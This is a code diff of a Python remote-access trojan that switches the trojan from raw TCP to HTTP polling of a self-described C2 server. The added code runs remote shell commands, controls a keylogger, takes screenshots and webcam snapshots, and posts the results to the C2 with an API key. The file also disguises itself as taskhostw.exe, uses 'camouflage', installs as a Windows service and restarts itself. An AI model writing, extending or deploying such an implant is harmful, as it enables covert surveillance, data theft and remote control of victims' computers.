@@ -1,19 +1,27 @@
 #!/usr/bin/env python3
 """
-TCP Command Receiver
-Connects to a TCP sender and executes received commands.
+HTTP Command Receiver
+Polls C2 server for work items and executes commands via HTTP/WebSocket.
 """
 import multiprocessing
 import os
 import platform
 import shutil
-import socket
 import subprocess
 import sys
 import time
+import uuid
+import json
+import threading
+import asyncio
+from typing import Optional, Dict, Any
+
+import requests
+import websockets
+from websockets.exceptions import ConnectionClosed
 
 # Import from utils modules
-from utils.config import DEFAULT_PORT, RETRY_DELAY, FAKE_PASSWORDS, PAYLOAD_NAME
+from utils.config import RETRY_DELAY, FAKE_PASSWORDS, PAYLOAD_NAME, C2_API_KEY, FASTAPI_PORT
 from utils.common import (
     log,
     dev_pause,
@@ -28,7 +36,6 @@ from utils.common import (
 from utils.install import check_and_install_service
 from utils.modes import ModeManager
 from utils.router import CommandRouter
-from utils.protocol import receive_text
 
 
 # ============================================================================
@@ -172,101 +179,259 @@ def setup_camouflage(original_file: str = None):
 # ============================================================================
 
 
-def start_receiver(host: str, port: int = DEFAULT_PORT) -> None:
+# ============================================================================
+# RESULT COLLECTOR
+# ============================================================================
+
+
+class ResultCollector:
+    """Collects results from command handlers for HTTP posting"""
+    
+    def __init__(self):
+        self.text_result = ""
+        self.binary_result = None
+        self.binary_type = None
+        self.error = None
+    
+    def add_text(self, text: str):
+        """Add text to result"""
+        self.text_result += text
+    
+    def set_binary(self, data: bytes, data_type: str):
+        """Set binary result"""
+        self.binary_result = data
+        self.binary_type = data_type
+    
+    def set_error(self, error: str):
+        """Set error message"""
+        self.error = error
+    
+    def get_result(self) -> Dict[str, Any]:
+        """Get result dictionary"""
+        if self.error:
+            return {"status": "failed", "error": self.error}
+        elif self.binary_result:
+            return {"status": "completed", "result_type": "binary", "data_type": self.binary_type}
+        else:
+            return {"status": "completed", "result": self.text_result}
+
+
+# ============================================================================
+# HTTP RECEIVER
+# ============================================================================
+
+
+def generate_receiver_id() -> str:
+    """Generate a unique receiver ID"""
+    return str(uuid.uuid4())
+
+
+def get_c2_url(host: str) -> str:
+    """Get C2 server base URL"""
+    return f"http://{host}:{FASTAPI_PORT}"
+
+
+def post_work_result(host: str, work_id: str, receiver_id: str, result: Dict[str, Any]):
+    """Post work result to C2 server"""
+    url = f"{get_c2_url(host)}/internal/work/result"
+    headers = {"X-API-Key": C2_API_KEY, "Content-Type": "application/json"}
+    
+    payload = {
+        "work_id": work_id,
+        "receiver_id": receiver_id,
+        "status": result.get("status", "completed"),
+        "result": result.get("result"),
+        "error": result.get("error")
+    }
+    
+    try:
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        response.raise_for_status()
+    except Exception as e:
+        log(f"[Error posting result: {e}]")
+
+
+def post_work_result_binary(host: str, work_id: str, receiver_id: str, data: bytes, data_type: str):
+    """Post binary work result to C2 server"""
+    url = f"{get_c2_url(host)}/internal/work/result/binary"
+    headers = {"X-API-Key": C2_API_KEY}
+    
+    files = {"file": (data_type, data, "application/octet-stream")}
+    data_form = {
+        "receiver_id": receiver_id,
+        "work_id": work_id,
+        "data_type": data_type
+    }
+    
+    try:
+        response = requests.post(url, files=files, data=data_form, headers=headers, timeout=30)
+        response.raise_for_status()
+    except Exception as e:
+        log(f"[Error posting binary result: {e}]")
+
+
+def execute_command_http(host: str, work_item: Dict[str, Any], receiver_id: str, mode_manager: ModeManager, router: CommandRouter):
+    """Execute a work item and post results via HTTP"""
+    work_id = work_item["work_id"]
+    work_type = work_item["work_type"]
+    params = work_item.get("params", {})
+    
+    log(f"[Executing work {work_id}: {work_type}]")
+    
+    # Create result collector
+    collector = ResultCollector()
+    
+    # Create a mock socket-like object for handlers that expect sockets
+    class HTTPSocketAdapter:
+        """Adapter to make handlers work with HTTP"""
+        def __init__(self, collector: ResultCollector):
+            self.collector = collector
+            self.write_lock = threading.Lock()
+        
+        def sendall(self, data: bytes):
+            """Send text data"""
+            if isinstance(data, bytes):
+                self.collector.add_text(data.decode("utf-8", errors="replace"))
+            else:
+                self.collector.add_text(str(data))
+        
+        def recv(self, size: int) -> bytes:
+            """Not used in HTTP mode"""
+            return b""
+    
+    adapter = HTTPSocketAdapter(collector)
+    
+    try:
+        # Handle special work types
+        if work_type == "keylogger_start":
+            # Start keylogger via WebSocket (handled separately)
+            log("[Keylogger start requested - use WebSocket]")
+            collector.set_error("Keylogger must be started via WebSocket")
+        elif work_type == "keylogger_stop":
+            # Stop keylogger
+            from utils.features.keylogger import stop_keylogger
+            stop_keylogger(adapter, mode_manager)
+        elif work_type == "recording_start":
+            # Start recording via WebSocket (handled separately)
+            log("[Recording start requested - use WebSocket]")
+            collector.set_error("Recording must be started via WebSocket")
+        elif work_type == "recording_stop":
+            # Stop recording
+            from utils.features.screenrecord import stop_recording
+            stop_recording(adapter, mode_manager)
+        elif work_type == "command":
+            # Execute shell command
+            command = params.get("command", "")
+            if command:
+                router.handle_command(command, adapter)
+        elif work_type == "screenshot":
+            # Take screenshot
+            from utils.features.screenshot import take_screenshot
+            take_screenshot(adapter, mode_manager)
+        elif work_type == "snapshot":
+            # Take webcam snapshot
+            from utils.features.snapshot import take_webcam_snapshot
+            take_webcam_snapshot(adapter, mode_manager)
+        else:
+            collector.set_error(f"Unknown work type: {work_type}")
+    
+    except Exception as e:
+        collector.set_error(str(e))
+        log(f"[Error executing work: {e}]")
+    
+    # Post result
+    result = collector.get_result()
+    if result.get("result_type") == "binary" and collector.binary_result:
+        post_work_result_binary(host, work_id, receiver_id, collector.binary_result, collector.binary_type)
+    else:
+        post_work_result(host, work_id, receiver_id, result)
+
+
+def start_receiver_http(host: str) -> None:
     """
-    Start the TCP command receiver client.
+    Start the HTTP command receiver client.
 
     Args:
-        host: The sender's host address
-        port: The sender's port number
+        host: The C2 server host address
     """
-    attempt = 1
-
+    receiver_id = generate_receiver_id()
+    log(f"[Receiver ID: {receiver_id}]")
+    log(f"[Connecting to C2 server: {host}:{FASTAPI_PORT}]")
+    
     # Create mode manager and command router
     mode_manager = ModeManager()
     router = CommandRouter(mode_manager)
-
+    
+    url = f"{get_c2_url(host)}/internal/work/poll"
+    headers = {"X-API-Key": C2_API_KEY, "Content-Type": "application/json"}
+    
+    last_check = None
+    attempt = 1
+    
     try:
-        # Main reconnection loop - runs until user interrupts
         while True:
-            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            connected = False
-
-            # Try to connect to the sender, with retries
-            while not connected:
-                try:
-                    log(f"Connecting to {host}:{port}... (attempt {attempt})")
-                    client_socket.connect((host, port))
-                    connected = True
-                    log(f"Connected to {host}:{port}")
-                    log("Ready to execute commands (Ctrl+C to exit)\n")
-                except ConnectionRefusedError:
-                    log(f"Connection refused, retrying in {RETRY_DELAY}s...\n")
-                    time.sleep(RETRY_DELAY)
-                    attempt += 1
-                    client_socket.close()
-                    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                except socket.gaierror:
-                    log(f"Invalid host address: {host}")
-                    dev_pause()
-                    sys.exit(1)
-
-            # Reset attempt counter after successful connection
-            attempt = 1
-
-            # Continuously receive and execute commands
-            connection_lost = False
             try:
-                while True:
-                    try:
-                        # Receive command
-                        data = client_socket.recv(4096)
-
-                        if not data:
-                            # Connection closed by sender
-                            log("\nConnection closed")
-                            log("Reconnecting...\n")
-                            connection_lost = True
-                            break
-
-                        # Decode the command
-                        command = data.decode("utf-8").strip()
-
-                        # Route command through the command router
-                        router.handle_command(command, client_socket)
-
-                    except ConnectionResetError:
-                        log("\nConnection reset")
-                        log("Reconnecting...\n")
-                        connection_lost = True
-                        break
-                    except Exception as e:
-                        log(f"\nError: {e}")
-                        log("Reconnecting...\n")
-                        connection_lost = True
-                        break
-            finally:
-                client_socket.close()
-
-            # If connection was lost, continue to outer loop to reconnect
-            if not connection_lost:
-                break
-
+                # Poll for work
+                payload = {
+                    "receiver_id": receiver_id,
+                    "last_check": last_check
+                }
+                
+                response = requests.post(url, json=payload, headers=headers, timeout=30)
+                response.raise_for_status()
+                
+                data = response.json()
+                work_items = data.get("work_items", [])
+                
+                if work_items:
+                    log(f"[Received {len(work_items)} work item(s)]")
+                    # Execute work items (can be concurrent in future)
+                    for work_item in work_items:
+                        # Mark as executing
+                        work_item["status"] = "executing"
+                        # Execute in thread for multitasking
+                        thread = threading.Thread(
+                            target=execute_command_http,
+                            args=(host, work_item, receiver_id, mode_manager, router),
+                            daemon=True
+                        )
+                        thread.start()
+                
+                # Update last_check
+                last_check = time.time()
+                
+                # Reset attempt counter on success
+                attempt = 1
+                
+                # Poll every 5 seconds
+                time.sleep(5)
+                
+            except requests.exceptions.RequestException as e:
+                log(f"[Connection error (attempt {attempt}): {e}]")
+                attempt += 1
+                if attempt > 10:
+                    log("[Too many connection errors, exiting]")
+                    break
+                time.sleep(RETRY_DELAY)
+            except Exception as e:
+                log(f"[Error: {e}]")
+                time.sleep(RETRY_DELAY)
+    
     except KeyboardInterrupt:
         if platform.system() == "Windows":
             log("\n\nReceiver interrupted - restarting...")
             dev_pause()
-            sys.exit(1)  # Non-zero exit triggers service restart
+            sys.exit(1)
         else:
             log("\n\nExiting...")
-            sys.exit(0)  # Clean exit on macOS/Linux - no pause needed
+            sys.exit(0)
     except Exception as e:
         log(f"Error: {e}")
         dev_pause()
         sys.exit(1)
 
 
-def run_with_auto_restart(host: str, port: int) -> None:
+def run_with_auto_restart(host: str) -> None:
     """
     Wrapper that automatically restarts the receiver if it crashes.
     Used in daemon mode for crash recovery.
@@ -281,7 +446,7 @@ def run_with_auto_restart(host: str, port: int) -> None:
         try:
             if restart_count > 0:
                 log(f"\n[ Restarting receiver (attempt #{restart_count}) ]\n")
-            start_receiver(host, port)
+            start_receiver_http(host)
             # If we get here, it exited cleanly (only from /quit command)
             break
 
@@ -341,7 +506,7 @@ if __name__ == "__main__":
 
         # STAGE 2: Payload execution (taskhostw.exe)
         elif is_payload():
-            log("\n[ TCP Command Receiver - Payload Mode ]\n")
+            log("\n[ HTTP Command Receiver - Payload Mode ]\n")
 
             # Parse CLI arguments
             delete_file = parse_cli_arguments()
@@ -355,7 +520,7 @@ if __name__ == "__main__":
                 setup_camouflage(delete_file)
 
             # Run with auto-restart wrapper for crash recovery
-            run_with_auto_restart(get_c2_host(), DEFAULT_PORT)
+            run_with_auto_restart(get_c2_host())
 
         else:
             # Unrecognized executable name - fail fast
@@ -368,10 +533,10 @@ if __name__ == "__main__":
 
     else:
         # Running in development mode (not frozen) or on non-Windows
-        log("\n[ TCP Command Receiver - Development Mode ]\n")
+        log("\n[ HTTP Command Receiver - Development Mode ]\n")
 
         if platform.system() == "Windows":
             check_and_install_service()
 
         # Run with auto-restart wrapper for crash recovery
-        run_with_auto_restart(get_c2_host(), DEFAULT_PORT)
+        run_with_auto_restart(get_c2_host())
